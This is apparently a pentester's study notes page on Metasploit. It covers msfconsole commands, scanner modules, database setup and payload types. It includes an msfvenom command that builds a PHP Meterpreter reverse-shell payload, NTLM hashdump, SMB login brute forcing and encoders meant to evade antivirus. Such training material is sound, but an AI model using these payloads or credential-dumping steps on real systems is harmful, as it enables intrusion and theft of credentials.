---
description: Framework that is used in all phases of penetration testing engagement
---

# Metasploit

Has two versions: Pro and Framework

Summary of components:

* `msfconsole` - main command-line interface
* Modules - supports modules such as exploits scanners payloads, etc.
* Tools - support standalone tools that wil help vulnerability resarch, assessement or pentesting.\
  Such tools are: msfvenom, pattern\_create and pattern\_offset
* It supports most linux commands (not output redirection)

Definitions:

* Exploit: a piece of code that uses a vulnerability present on the target system
* Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system
* Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

{% tabs %}
{% tab title="Basic Commands" %}
- `help <CMD>` - gives help menu for a specific command
- `use <library>` - uses a tool as an exploit for example
- `show options` - shows the list of options relative to a context selected
- `show <type>` - show a list of available modules to be used
- `back` - leave the context
- `info (<MODULE>)` - gives infos about a module
- `search (<type>) <CVE/EXPLNAME>` gives list of modules relevant to specific parameter
- `set <PARAMETER> <VALUE>` - gives value to a specific parameter
- `unset <parameter/all>` - clear an option
- `setg <param> <val>` - set parameters for all modules
- `unsetg <param/all>` - clear a global option for all modules
- `exploit / run (-z)` - Command to execute the module (in background)
- `check` - can be used to check if a system is vulnerable without exploiting it
- `sessions -i <val>` - used to retrieve background sessions (or interact with it)
{% endtab %}

{% tab title="Modules" %}
You can use Nmap for scanning part, even tough metasploit has some great modules

* auxiliary/scanner/discovery/udp\_sweep - module that allows to quickly identify services running over UDP (such as DNS and NetBios)
* auxiliary/scanner/smb/smb\_version or smb\_enumshares  - scan SMB services
* auxiliary/scanner/smb/smb\_login - bruteforce login
* auxiliary/scanner/http/http\_version - scan HTTP services\

{% endtab %}

{% tab title="Database" %}
{% hint style="info" %}
First steps in shell not in msfconsole
{% endhint %}

Start posgres

```
systemctl start postgresql
```

* `msfdb init` - init Metasploit Database

### In Metasploit

* `db_status` - retrieve the status of Database
* `workspace` - allows to separate projects
* `workspace -a <name>`  - add a new workspace
* `workspace -d <name>` - delete a workspace
* `workspace -h` - get help
* `help` - will now show the database relative commands
* `db_nmap` - allows to save results in a DB
* `hosts (-h)` - you can now print info about hosts
* `services (-h)` - same with running services
* `services -S <service>` - allows to search for specific service
{% endtab %}

{% tab title="Meterpreter" %}
* `hashdump` - dump ntlm hashes
{% endtab %}

{% tab title="Msfvenom" %}
List payloads

```
msfvenom -l payloads
```

List formats

```
msfvenom --list formats
```

Set encoding, protocol and output type&#x20;

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

### Handlers

They are the listening connection for payloads connection to our handler
{% endtab %}
{% endtabs %}

## Types

### Auxiliary

* Supports modules such as Scanners, Crawlers, fuzzers

### Encoders

* Supports modules that encode payloades in hope that sig-based antivirus miss them even if this is not the primary goal of encoding

### Evasion

* Used to evad antivirus detection

### Exploits

* Uses vulnerabilities in systems

### NOPs

* Does Nothing. They are often used as a buffer to achieve consistent payload sizes.

### Payloads

* Code that will run over a target system
* Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
* Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
* Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
* Stages: Downloaded by the stager. This will allow you to use larger sized payloads.

### Post

* They are useful on final stage of pentesting for post-exploitation
